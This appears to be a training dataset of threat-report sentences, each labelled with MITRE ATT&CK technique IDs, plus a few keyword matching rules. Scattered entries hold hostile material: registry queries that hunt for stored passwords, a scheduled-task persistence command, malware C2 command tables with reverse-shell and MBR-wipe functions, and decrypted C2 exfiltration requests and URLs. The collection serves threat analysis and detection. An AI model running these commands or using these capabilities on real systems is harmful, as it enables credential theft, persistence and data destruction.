They apparently create a Domain Admin account  named SQLSVC and give it the password Br4pbr4p (which also happens to be the password salt preconfigured in the dirtycow exploit script) and then leverage that account to perform a series of commands.	['T1136']
smb and exploit in same sentence	['T1210']
The decoy file, doc.rtf, contains an OLE object that uses Equation Editor to drop the embedded shellcode in %TEMP%	['T1559.002']
The decrypted shellcode is dropped as a Microsoft Word plugin WLL  into C:\Users\ADMINI~1\AppData\Roaming\Microsoft\Word\STARTUP.	['T1137']
The wormDll32 module attempts to identify servers and domain controllers in the network using NetServerEnum and LDAP queries.	['T1482']
This module searches the infected system’s files to gather email addresses for information-stealing purposes.	['T1114']
A USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file.	['T1025']
overwrite or delete MBR in same sentence	['T1561.002']
master boot record wiper	['T1561.002']
MBR + overwrite/wipe	['T1561.002']
reg query HKLM /f password /t REG_SZ /s	['T1552.002']
reg query HKCU /f password /t REG_SZ /s	['T1552.002']
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager	['T1546.009']
COM and execution in same sentence	['T1021.003']
C:\Windows\System32\sethc.exe	['T1546.008']
collect + keychain in same sentence	['T1555.001']
looks for net and account or domain in close proximity	['T1201']
!ProcessList List running processes, including their PID, parent PID, executable name and priority   !SendFileToServer Uploads a specified file to the C2 server   !CaptureScreen Takes a screenshot that it saves to a file and uploads to the C2 server	['T1057', 'T1105']
(Source: Dell SecureWorks) Appendix C — OwaAuth web shell analysis OwaAuth is a web shell that is installed as an ISAPI filter on Exchange servers and shares characteristics with the ChinaChopper web shell	['T1059', 'T1505.003']
(Source: Dell SecureWorks)  ChinaChopper web shell — A web-based executable script (see Figure 4) that allows a threat actor to execute commands on the compromised system	['T1059', 'T1505.003']
(Source: Dell SecureWorks) Table 4 lists the OwaAuth web shell commands available to the adversary	['T1059', 'T1505.003']
(Source: Dell SecureWorks)   The following tools appear to be exclusive to TG-3390:  OwaAuth web shell — A web shell and credential stealer deployed to Microsoft Exchange servers	['T1059', 'T1505.003']
(Source: SecureWorks)  NetWire logs keystrokes and peripheral inputs into encoded files in the C:\Users\<username>   Figure 3	['T1033', 'T1056']
(Source: SecureWorks)  The “Windows Folder.exe” executable spawns and injects code into the legitimate notepad.exe Windows process (see Figure 2)	['T1055.012', 'T1055']
0x007CFABF  video  Desktop video recording    0x06E533C4  download  Downloads executable and injects into new process    0x00684509  ammyy  Ammyy Admin tool    0x07C6A8A5  update  Updates self    0x0B22A5A7     Add/Update klgconfig (analysis incomplete)    0x0B77F949  httpproxy  Starts HTTP proxy    0x07203363  killos  Renders computer unbootable by wiping the MBR    0x078B9664  reboot  Reboots the operating system    0x07BC54BC  tunnel  Creates a network tunnel    0x07B40571  adminka  Adds new C2 server or proxy address for pseudo-HTTP protocol    0x079C9CC2  server  Adds new C2 server for custom binary protocol    0x0007C9C2  user  Creates or deletes Windows user account    0x000078B0  rdp  Enables concurrent RDP (analysis incomplete)    0x079BAC85  secure  Adds Notification Package (analysis incomplete)    0x00006ABC  del  Deletes file or service    0x0A89AF94  startcmd  Adds command to the configuration file (see the Configuration section)    0x079C53BD  runmem  Downloads executable and injects directly into new process    0x0F4C3903  logonpasswords  Send Windows accounts details to the C2 server    0x0BC205E4  screenshot  Takes a screenshot of the desktop and sends it to the C2 server    0x007A2BC0  sleep  Backdoor sleeps until specified date    0x0006BC6C  dupl  Unknown    0x04ACAFC3     Upload files to the C2 server    0x00007D43  vnc  Runs VNC plugin    0x09C4D055  runfile  Runs specified executable file    0x02032914  killbot  Uninstalls backdoor    0x08069613  listprocess  Returns list of running processes to the C2 server    0x073BE023  plugins  Change C2 protocol used by plugins    0x0B0603B4     Download and execute shellcode from specified address    0x0B079F93  killprocess  Terminates the first process found specified by name    0x00006A34  cmd  Initiates a reverse shell to the C2 server    0x09C573C7  runplug  Plugin control    0x08CB69DE  autorun  Updates backdoor    Table 2: Supported Commands Configuration A configuration file resides in a file under the backdoor’s installation directory with the .bin extension	['T1041', 'T1105', 'T1008']
13 14 ams_api64.dll ams_api32.dll Handy wrapper around API of exXX.dll, pdXX.dll, sgXX.dll	['T1055', 'T1574.001', 'T1574.002']
2.     The macro decodes the dropped files using Windows certutil.exe (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows).    3.     The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) (esentutil.exe is also a legitimate program that is pre-installed in Windows). The dropped files include the following:  GUP.exe : GUP, a free (LGPL) Generic Updater. GUP is an open source binary used by Notepad++ for software updates	['T1055.012', 'T1106', 'T1036', 'T1010']
22 Keylogging and exfiltrating data The exfiltrated data is base64 that decodes into more custom encoded strings that appear to be “/” delimited	['T1140', 'T1560']
37 38 zlib64.dll zlib32.dll Open source “zlib” version 1.2.3 used by libpngXX.dll for compressing screenshots (ssXX.dll)	['T1055', 'T1574.002']
59 60 61 62 freeimage_32.dll freeimageplus_32.dll freeimage_64.dll freeimageplus_64.dll FreeImage open source library supports popular graphics image formats (ver 3.15.4 2012-10-27) (http://freeimage.sourceforge.net)	['T1055', 'T1574.001']
68271df868f462c06e24a896a9494225,Office Monkeys LOL Video.zip Believe it or not, recipients in bulk run the file within: 95b3ec0a4e539efaa1faa3d4e25d51de,Office Monkeys (Short Flash Movie).exe This file in turn drops two executables to %temp%: 2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe 3d3363598f87c78826c859077606e514, player.exe It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague	['T1036', 'T1125']
Additional Features The Zyklon malware offers the following additional capabilities (via plugins): Browser Password Recovery Zyklon HTTP can recover passwords from popular web browsers, including:  Google Chrome Mozilla Firefox Internet Explorer Opera Browser Chrome Canary/SXS CoolNovo Browser Apple Safari Flock Browser SeaMonkey Browser SRWare Iron Browser Comodo Dragon Browser  FTP Password Recovery Zyklon currently supports FTP password recovery from the following FTP applications:  FileZilla SmartFTP FlashFXP FTPCommander Dreamweaver WS_FTP  Gaming Software Key Recovery Zyklon can recover PC Gaming software keys from the following games:  Battlefield Call of Duty FIFA NFS Age of Empires Quake The Sims Half-Life IGI Star Wars  Email Password Recovery Zyklon may also collect email passwords from following applications:  Microsoft Outlook Express Microsoft Outlook 2002/XP/2003/2007/2010/2013 Mozilla Thunderbird Windows Live Mail 2012 IncrediMail, Foxmail v6.x - v7.x Windows Live Messenger MSN Messenger Google Talk GMail Notifier PaltalkScene IM Pidgin (Formerly Gaim) Messenger Miranda Messenger Windows Credential Manager  License Key Recovery The malware automatically detects and decrypts the license/serial keys of more than 200 popular pieces of software, including Office, SQL Server, Adobe, and Nero	['T1003', 'T1552.001']
Additional mitigations that could help to prevent attacks like these from succeeding in your environment include:  Changing the default handler for “.hta” files in your environment so that they cannot be directly executed.hta” files in your environment so that they cannot be directly executed	['T1070.004', 'T1105']
After decrypting and decompressing the strings, we can trivially identify aspects of the PlugX configuration	['T1140', 'T1027']
Afterwards, the persistence file will be created in /Library/LaunchDaemons/ or ~/Library/LaunchAgents/  folder	['T1564.001', 'T1543.001']
After we decrypted the additional shellcode, we determined that the functional shellcode is part of the Metasploit Framework, specifically using the block_api.asm code to resolve API function names and the block_reverse_http.asm code to obtain additional shellcode to execute on the system	['T1140', 'T1105']
All of the backdoors identified - excluding RoyalDNS - required APT15 to create batch scripts in order to install its persistence mechanism	['T1064', 'T1547.001']
All of these files reside in the victim’s %TEMP% directory:    Filename Description   9PT568.dat Contains victim unique identifier   TPX498.dat Keystroke logs   edg499.dat List of interesting files   TPX499.dat Temporarily holds screenshot when given command by C2   up Temporarily contains downloaded file to be executed when given command by C2      Other changes we noticed in this variant include how the malware obfuscates C2 information stored via dead drop resolvers	['T1036', 'T1041']
Amongst the downloaded files,  the fake .gif and .jpg files appear to be dependencies for the malware	['T1083', 'T1105']
A much more advanced and highly obfuscated Javascript script was utilized in White Atlas samples that dropped a Firefox extension backdoor developed by Turla, but again the script was responsible for the simple tasks of writing out the extension.json configuration file for the extension and deleting itself for cleanup purposes	['T1070.004', 'T1064', 'T1027']
Any information gathered from the endpoint is first stored in the following file, encrypted, and sent to the control server:  C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  The following information is gathered from the endpoint, stored in the file 1.hwp, and sent to the control server:  Directory listing of the user’s Desktop folder using command:  cmd.exe /c dir C:\DOCUME~1\<username>\Desktop\ >> C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  Directory listing of the user’s recently accessed files using command:  cmd.exe /c dir C:\DOCUME~1\<username>\Recent >> C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  Directory listing of the system’s %programfiles% folder using command:  cmd.exe /c dir C:\PROGRA~1\ >> C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  Systeminfo of the endpoint using command:  cmd.exe /c systeminfo >> C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  Copies the file ixe000.bin from:  C:\Documents and Settings\<username>\Application Data\Microsoft\Windows\UserProfiles\ixe000.bin To: C:\DOCUME~1\<username>\APPLIC~1\MICROS~1\HNC\1.hwp  Registry key and value information for the current user’s Run key (with information collected):  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Number of subkeys (<KeyIndex>) <KeyName> Number of Values under each key including the parent Run key (<ValueIndex>) <Value_Name> <Value_Content>  Registry Run key enumeration by Gold Dragon	['T1033', 'T1547.001', 'T1486']
Apart for its backdoor routines, this malware can steal information through keylogging, audio recording, and screen capture	['T1113', 'T1123']
A shortcut file is generated in the following path:  %TEMP%\~Update.lnk  This ‘~Update.lnk’ file is then copied to a filename of ‘Windows help.lnk’, which is placed in the startup path previously identified	['T1036', 'T1547.009']
As shown in Figure 11, after compromising an initial victim's system (patient 0), the threat actors use the Baidu search engine to search for the victim's organization name	['T1082', 'T1083']
Assuming the victim opens the attachment, the infection process begins as described in the following section.Many of the distribution servers that are being used to host the HawkEye keylogger binaries that are retrieved during the infection process are hosting large numbers of malicious binaries and, in many cases, contain open directory listings that can be used to identify the scope of the infections that they are being used to facilitate	['T1057', 'T1056']
A string with the 5-character length and encoded with BASE64 is added to the beginning of the buffer encoded using the BASE64 algorithm	['T1027', 'T1132']
Attack Flow and Exfiltration After injecting into the targeted processes, the modules continue their malicious activity through those processes	['T1055', 'T1057']
AutoFocus customers may learn more from the DarkHydrus tag  IOC Related SHA256 Hashes Payloads cec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1 ac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4 a547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88 d428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda dd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa b2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81 c8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3 ce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00 99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c Delivery documents d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318 8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde 9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49 cf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9 0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1 0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82 870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8 ff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0 01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2 6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a 47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870 776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4 cf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0 e88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678 26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245 b5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350 ad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c Related Domains maccaffe[.]com cisc0[.]net 0utl00k[.]net msdncss[.]com 0ffice[.]com 0ffiice[.]com micrrosoft[.]net anyconnect[.]stream bigip[.]stream  fortiweb[.]download  kaspersky[.]science  microtik[.]stream  owa365[.]bid  symanteclive[.]download  windowsdefender[.]win allexa[.]net kaspersky[.]host hotmai1[.]com 0utlook[.]bid	['T1087']
Backdoor.Remexi, one of the malware in use by Chafer, had the following  command and control host: 87pqxz159.dockerjsbin[.]com Interestingly, IP address  83.142.230.138, which serve as a command and control address for an OilRig related sample (3a5fcba80c1fd685c4b5085d9d474118), was pointed to by 87pqxz159.dockerjsbin[.]com as well	['T1016', 'T1102']
The implant either fetches the user agent from Internet Explorer (using ObtainUserAgentAsString()) or uses a default user agent specified in the malware binary: Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36 Control Server Communications. The malware initiates communication with the control server by sending it an HTTP POST request with additional optional HTTP data.	['T1036', 'T1048', 'T1132']
Based on the McAfee Advanced Threat Research team’s analysis, we find multiple components from this operation are unique from a code perspective, even though the code is loosely based on previous versions of the SYSCON backdoor	['T1140', 'T1027.001']
By using this method, it will copy itself into a running Internet Explorer process in order to avoid detection by running as an independent process	['T1055', 'T1057']
C2 Command   Purpose    reboot  Reboot the system using shutdown command    shutdown  Shut down the system using shutdown command    clean  Wipe the Drives, C:\, D:\, E:\, F:\    screenshot  Take a screenshot of the System    upload  Encrypt and upload the information from the system    excel  Leverage Excel.Application COM object for code execution    outlook  Leverage Outlook.Application COM object for code execution    risk  Leverage DCOM object for code execution   Conclusion This activity shows us that TEMP.Zagros stays up-to-date with the latest code execution and persistence mechanism techniques, and that they can quickly leverage these techniques to update their malware	['T1113', 'T1082', 'T1053.005', 'T1106', 'T1140']
ChromeUpdate.exe starts the file with “rundll32 cache.dll,ADB_Setup” Cache.dll analysis  Cache.dll was written in C/C++ and built with a Microsoft compiler	['T1055', 'T1218.011']
Code is included to copy the clipboard, delete files, compress files, clear event logs, shut down the machine, and much more	['T1115', 'T1070.004', 'T1070']
Command_Keylog_offline:  Load into memory a dll that contains the function “PluginMe”.  After researching and analyzing additional Gh0stRAT samples while trying to figure out what dll contains “PluginMe”, I found a DLL for keylogging (called Keylog.dll) in a Gh0stRAT 2.0 sample that exported “PluginMe”.  Using that and a cross-comparison of another Gh0stRAT sample that I’ve previously analyzed, I was able to determine that “PluginMe” is a offline keyboard manager	['T1055', 'T1574.001', 'T1218.011', 'T1574.002', 'T1056']
Command_Update_Server:  This command passes the string “Gh0st Update” to the malware sample before running the sample again.  When the sample restarts, it detects the “Gh0st Update” command line arg, and connects to the server in order to update the sample.  Command_Clean_Event:  This command locates and deletes all of the event logs on the system	['T1070.004', 'T1059', 'T1070', 'T1102']
Command   Description    0x31  Fingerprint System via WMI and Registry    0x32  Drop File and execute    0x33  Remote Shell    0x34  Terminate connection with C2    0x35  Download and run batch script    0x36  Download file on machine    0x37  Upload File    Table 2: FELIXROOT backdoor commands Figure 9 shows the log message decrypted from memory using the same mechanism shown in Figure 6 and Figure 7 for every command executed	['T1064', 'T1105']
Command  Description  Action  0  Server response string contains batch commands  Execute batch commands and send results back to server  1  Server response string is a file path  Check for file path and upload (PUT) the file to server  2  Server response string is a file path  Check for file path and download (GET) the file   Table 1: POWRUNER commands After successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution	['T1070.006', 'T1041', 'T1105']
Command Functionality   Init Create a reverse shell   Write Write a file to the compromised system from the C2 server   List List the files in a directory   Upload Upload a file from the compromised system to the C2 server    Table 2	['T1041', 'T1105']
Command IDDescription     0Uninstall Keydnap and quit   1Update the backdoor from a base64-encoded file   2Update the backdoor given a URL   3Decode and execute a base64-encoded file   4Decode and execute a base64-encoded Python script   5Download and execute a file from a URL   6Download and execute a Python script from a URL   7Execute a command and report the output back to the C&C server   8Request administrator privileges the next time the user runs an application   9Decode and execute, or stop, a base64-encoded file calledauthd_service    The last two commands stand out	['T1140', 'T1132', 'T1569.002']
Comnie will make requests to these URLs, looking for base64-encoded data after an identifier of ‘magnet:/’, as seen in the example below: Figure 14 GitHub storing Comnie C2 information In the example above, the C2 information is being stored within the user’s URL parameter within GitHub	['T1102', 'T1041']
Continuing Malicious Activity and Manipulating Additional Security Products After the module loads with regsvr32.exe, the Irdsnhrxxxfery64 module injects another module Irdsnhrxxxfery98, which was downloaded by the script into regsvr32.exe using the LoadLibraryExW() function	['T1055', 'T1218.010']
Create processes Write responses from the control server to a file Send information for all drives Write data sent by the control server to a temporary file matching the file path pattern %temp%\DWS00* Change the time of a file as specified by the control server  The malware changing the file time	['T1070.006', 'T1074', 'T1041']
cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbs persistence	['T1053.005', 'T1064']
Cyber analysts are encouraged to review the information provided in this alert to detect signs of malicious network activity.Tools and capabilities used by HIDDEN COBRA actors include DDoS botnets, keyloggers, remote access tools (RATs), and wiper malware	['T1518.001', 'T1018']
Decrypted Config: C&C IP: 192.168.0.107 Port: 80 Sleep Timer: 30000 Campaign Identifier: Mirage If you look at it the decrypted configuration, you may notice that the IP being used for the C&C is an internal IP address	['T1140', 'T1016']
Deletes the registry key HKCU\Software\Classes\Applications\rundll32.exe\shell\open Deletes the dropper components from the system	['T1070.004', 'T1112']
Different colors show the three dropped modules: legit app (blue), launcher (green), and decompressor with the Trojan embedded (red) The initial module drops three files that are typical for Chinese-speaking actors: a legit Symantec pcAnywhere (IntgStat.exe) for DLL side loading, a .dll launcher (pcalocalresloader.dll) and the last-stage decompressor (thumb.db)	['T1055', 'T1574.002']
Downloading stylesheets allows for emended JavaScript and VBS to be run from within them, at which point any type of malware could be staged and run quite easily	['T1064', 'T1547.001']
During our investigation of one of the compromised servers we found an application that, at first glance, appeared to be a legitimate SSH server called Dropbear SSH	['T1036', 'T1021']
During the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST request to the URL:  http://ink[dot]inkboom.co.kr/host/img/jpg/post.php  HTTP data/parameters used in the request include:  Content-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded & encrypted system info> User Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322) Accept-Language: en-us HTTP Version: HTTP/1.0    The malware can also download and execute additional components served to it by the control server	['T1071', 'T1048', 'T1132', 'T1486']
During the past few months, APT34 has been able to quickly incorporate exploits for at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organizations in the Middle East	['T1068', 'T1203']
"Embed ""scriptlets"" in generated payloads to perform some tasks ""offline"" without needing network connectivity (ex: start keylogger, add persistence, execute custom python script, check_vm, etc.)   Multiple Target Platforms:      Platform Support Status     Windows XP Supported   Windows 7 Supported   Windows 8 Supported   Windows 10 Supported   Linux Supported   Mac OSX Limited Support   Android Limited Support    Documentation All documentation can be found on the wiki"	['T1106', 'T1010']
Encoding the encryption key  In order for the C&C server to decrypt the encrypted data, the randomly generated AES256 key must be included in the packet along with the encrypted data	['T1573', 'T1486']
Encrypted Configuration in shellcode The configuration information for the malware, including the C2 information are encrypted in the first shellcode blob and are passed as an argument to the DllMain function of the main PlugX DLL	['T1082', 'T1140', 'T1027']
Escalate Privileges APT40 uses a mix of custom and publicly available credential harvesting tools to escalate privileges and dump password hashes	['T1003', 'T1068']
Examining the use of the unique user agents’ strings over time shows that while previously only the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the Zebrocy tool for its C2 communications	['T1033', 'T1543.001']
Exfiltration BRONZE UNION has also leveraged various web shells to collect and stage data for exfiltration	['T1074', 'T1505.003', 'T1132']
Figure 11: XML configuration file to schedule the task The Zyklon malware first retrieves the external IP address of the infected machine using the following:  api.ipify[.]org ip.anysrc[.]net myexternalip[.]com whatsmyip[.]com  The Zyklon executable contains another encrypted file in its .Net resource section named tor	['T1036', 'T1027']
Figure 12: RSA public key 1    Figure 13: RSA public key 2    Figure 14: AES encryption parameters After encryption, the cipher text to be sent over C2 is Base64 encoded	['T1573']
Figure 13: Zyklon issuing “settings” command and subsequent server response    Figure 14: Zyklon issuing “sign” command and subsequent server response    Figure 15: Zyklon issuing “ddos” command and subsequent server response Plugin Manager Zyklon downloads number of plugins from its C2 server	['T1016', 'T1105']
Figure 2: Textbox inside DOC The combined script from Word textbox drops the following components: \Users\[user_name]\Intel\58d2a83f7778d5.36783181.vbs \Users\[user_name]\Intel\58d2a83f777942.26535794.ps1 \Users\[user_name]\Intel\58d2a83f777908.23270411.vbs Also, the script creates a named schedule task for persistence to launch “58d2a83f7778d5.36783181.vbs” every 25 minutes	['T1033', 'T1036', 'T1087', 'T1064', 'T1204']
Figure 26. Communication with the C&C server after the exchange of OS packet info Meanwhile, the runHandle method of the main backdoor loop will call for the requestServer method with the following backdoor commands (each command has one byte long code and is extracted by Packet::getCommand):   Figure 27. The getCommand method The figure below shows the example of two of several possible command codes	['T1140', 'T1008']
Figure 4: APT32 ActiveMime Lures Create Two Named Scheduled Tasks In this example, a scheduled task named “Windows Scheduled Maintenance” was created to run Casey Smith’s “Squiblydoo” App Whitelisting bypass every 30 minutes	['T1053.005', 'T1036']
Figure 5: Sample pseudo-HTTP beacon The pseudo-HTTP protocol uses any proxies discovered by the HTTP proxy monitoring thread or added by the adminka command	['T1071', 'T1090']
File Indicators Samples Observed from Spear Phishing Messages Above    Filename Chinas_Arctic_Dream.doc   File Size 6587812 bytes   MD5 598eeb6a18233023f3551097aa49b083   SHA1 e9a46966f93fe15c22636a5033c61c725add8fa5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe	['T1036', 'T1083']
Filename The_Four_Traps_for_China.doc   File Size 4428595 bytes   MD5 7659c41a30976d523bb0fbb8cde49094   SHA1 3f1f3e838a307aff52fbcb5bba5e4c8fe68c30e5   Notes Malicious RTF document that exploits CVE-2017-8570 and drops QuasarRAT file qrat.exe	['T1036']
FIN7 uses CARBANAK as a post-exploitation tool in later phases of an intrusion to cement their foothold in a network and maintain access, frequently using the video command to monitor users and learn about the victim network, as well as the tunnel command to proxy connections into isolated portions of the victim environment	['T1090', 'T1049']
Finally, the malware executes the extracted install.bat script before deleting the original files and exiting	['T1070.004', 'T1064']
Finally, the Trojan creates a scheduled task to run itself every three minutes by running the following command on the command prompt after replacing the %path% string with the path to the srvResesponded.vbs VBScript:SchTasks /Create /SC MINUTE /MO 3 /TN “InetlSecurityAssistManager” /TR “wscript %path%” /f The Trojan uses HTTP to communicate with its C2 server, specifically using the InternetExplorer application object within an embedded Microsoft .NET Framework assembly called Interop.SHDocVw	['T1071', 'T1053.005']
First, the macro attempts to enable macros in multiple versions of Word, PowerPoint, Publisher and Excel by setting the following registry keys to the value of 1: HKCU\Software\Microsoft\Office\11.0\Word\Security\VBAWarnings  The macro also attempts to disable protections provided by the Protected View capability within Word, Excel, and PowerPoint by setting the following registry keys to a value of 1: HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV    First Stage Payload The payload installed by the macro is a downloader Trojan written in VB.NET that downloads a secondary payload and decoy document	['T1553.002', 'T1518.001', 'T1005', 'T1027.001', 'T1112', 'T1598.002', 'T1204', 'T1203', 'T1497']
Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates	['T1553.002', 'T1083']
For example, From <COMPUTER-NAME> (01-04 11-40-02).txt  All the text files are now packed into the archive temp.zip (%temp%\temp.zip) zip is Base64 encoded (with a custom key, same as that used in the malicious document) and then copied to post.txt txt is uploaded to the control server  Additional Commands and Capabilities The service-based DLL implant traverses to the /htdocs/ directory on the FTP server and looks for any files with the keywords:  TO EVERYONE: Commands issued to all infected endpoints TO <COMPUTERNAME>: Commands issued to endpoints matching the ComputerName  The following commands are supported by the malware implant:  cmd /c pull <filename>: Adds filename to temp.zip, Base64 encodes, and uploads to control server cmd /c chip <string>: Deletes current ipnet.ini config file	['T1059', 'T1560', 'T1132']
For example, the following string would be included in one of the HTTP parameters sent to the C2 server: eRmaVsr90D-7Ig1ngV3PkdouzP974 In this specific case, the actor made a mistake when configuring this XAgent sample with its C2 locations	['T1071', 'T1008']
For instance, here are the resulting decrypted strings from each of the case statements (dd7e69e1…): Case – String decrypted 1 – 185.25.50[.]93 2 – POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\r\nHost: 185.25.50[.]93\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 3 – porg= 4 – Content-Length: The Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above to create HTTP requests	['T1071', 'T1140', 'T1008']
For instance, the following data exists within a resource: fb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f By multiplying each byte with -1, we obtain the following data: 05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1 After using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext data appears: \x00\x00\x00\x00FlashRun.vbs We do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to store an embedded VBScript file, such as %Temp%\4.tmp\5.vbs	['T1036', 'T1064', 'T1486']
From our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality	['T1140', 'T1056']
From those servers the threat actor could use a web shell to retrieve the encrypted archives:  copy \\{FILE PATH}\c$\programdata\*.tmp \\{FILE PATH}\ServiceDesk\custom\style After exfiltrating the files, the threat actor used web shell access on the staging server to delete the staged RAR archives and detach their network shares, likely to avoid detection	['T1070.004', 'T1505.003']
Function for scrambling AES256 key in the outgoing packet  Some screenshots taken during scrambling and encryption process:   Figure 21. The highlighted bytes represent the scrambled computer info   Figure 22. Randomly generated AES256 key   Figure 23. Scrambled AES256 key (0xC1 XOR 0x13 = 0xD2, 0xD2 ROL 6 = 0xB4) etc.)   Figure 24. Computer info encrypted with AES256 key   Figure 25. Screenshot of the final payload to be sent to C&C server	['T1113', 'T1573']
Gather the process time for all processes  Getting time information for all processes running on the system	['T1055', 'T1057', 'T1124']
Generate payloads in various formats:      Format Architecture Short Name     Android Package x86 & ARMv7 apk   Linux Binary x86 lin_x86   Linux Binary x64 lin_x64   Linux Shared Object x86 so_x86   Linux Shared Object x64 so_x64   Windows PE Executable x86 exe_x86   Windows PE Executable x64 exe_x64   Windows DLL x86 dll_x86   Windows DLL x64 dll_x64   Python Script x86 & x64 py   PyInstaller x86 & x64 pyinst   Python Oneliner x86 & x64 py_oneliner   Powershell x86 & x64 ps1   Powershell Oneliner x86 & x64 ps1_oneliner   Ducky Script N/A rubber_ducky      Deploy in memory from a single command line using python or powershell one-liners	['T1106', 'T1010', 'T1059.001']
Get-Process | select Company Checks to see if any running processes have “Wireshark” or “Sysinternals” as the company name	['T1518.001', 'T1057']
Having a Meterpreter session on a compromised computer allows for full control of the computer and exfiltration of any data, and in some cases lateral movement inside the organization	['T1123', 'T1132']
Here is the content of the file: /shellcode <90909090909090909090E800<...redacted…>4D2D6DC95CBD5DC1811111111111111> def <7B0D0A2756...redacted…>312067657420636C6F736566696C650D0A717569740D0A7D> token pop exch pop Exec  The executed shellcode will first perform a decoding routine designed to download an additional payload from the internet	['T1064', 'T1105']
High Commissioner of Bangladesh Pakistan eying Sukhoi-35 fighter planes as part of defense deal from Russia 2018.143 PG COURSE IN 2018-2021 BATCH India Bangladesh and Pakistan Press Release on Observance of Historic Mujibnogor Dibosh by Pakistan Mission on 17 April 2018 Afghan Bomb Blast report by ISI USAJOBS Daily Saved Search Results for New GS15 for 3/30/2018 How Rigging take place in Senate Elections in Pakistan Afghan Terrorist group details ISI Restricted113 1971 Liberation War Freedom Fighters in Pakistan Army Custody Database  Additionally, the following filenames were witnessed in these attacks (spelling and grammar mistakes included):  Liberation Freedom Fighter.xlam NSC details of participants.xlam Raw Sect Vikram report on Pak Army Confidential.doc USA Immagration Policy for Families.ppam doc CV FM.doc doc Sukhoi35 deal report.doc Nominal Roll.doc Press Release 17 April.doc Afghan Blast report by ISI.doc Rigging in Pakistan Senate.doc Afghan Terrorist group report.doc    The payloads for these attacks varied in malware family	['T1083']
Hook module structure After decrypting the strings, it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules:  The CNC’s IP address in the Linux module This Linux module can process the following commands, some of which are similar to the Windows version:    die  delete all BlackEnergy2 files and system traces   kill  delete all BlackEnergy2 files and system traces and reboot   lexec  launch a command using bin/sh   rexec  download and launch file using ‘fork/exec’   update  rewrite self file   migrate  update the CnC server    Windows Plugins After the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater attention to new BE2 samples and associated CnCs	['T1106', 'T1070.004', 'T1105']
